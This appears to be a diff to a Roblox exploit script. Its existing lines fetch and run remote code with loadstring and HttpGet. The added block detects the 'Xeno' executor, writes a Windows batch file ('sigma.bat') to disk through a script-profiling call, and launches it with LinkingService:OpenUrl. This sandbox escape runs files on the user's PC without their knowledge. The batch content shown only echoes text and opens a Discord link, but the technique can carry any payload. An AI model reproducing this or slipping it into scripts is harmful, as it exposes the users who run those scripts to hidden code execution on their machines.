@@ -14,3 +14,27 @@ elseif newChat then
 elseif oldChat then
     loadstring(game:HttpGet(OLD_CHAT_URL))()
 end
+if identifyexecutor then
+    local executor = identifyexecutor()
+    if executor == "Xeno" then
+        print("xeno detected!")
+        local unwrappedgame = Instance.new("Part", workspace):FindFirstAncestorWhichIsA("DataModel")
+    local unwrappedgame = script:FindFirstAncestorWhichIsA("DataModel")
+
+    script:FindFirstAncestorWhichIsA("DataModel").LinkingService:OpenUrl(
+    script:FindFirstAncestorWhichIsA("DataModel")
+        :FindService("ScriptContext")
+        :SaveScriptProfilingData(
+            [[
+                @echo off
+				echo thanks for using my script bro
+                start https://discord.gg/8pJCFW8cpG
+                pause
+            ]], 
+            "sigma.bat"
+        )
+)
+    else
+        print("nice!")
+    end
+end
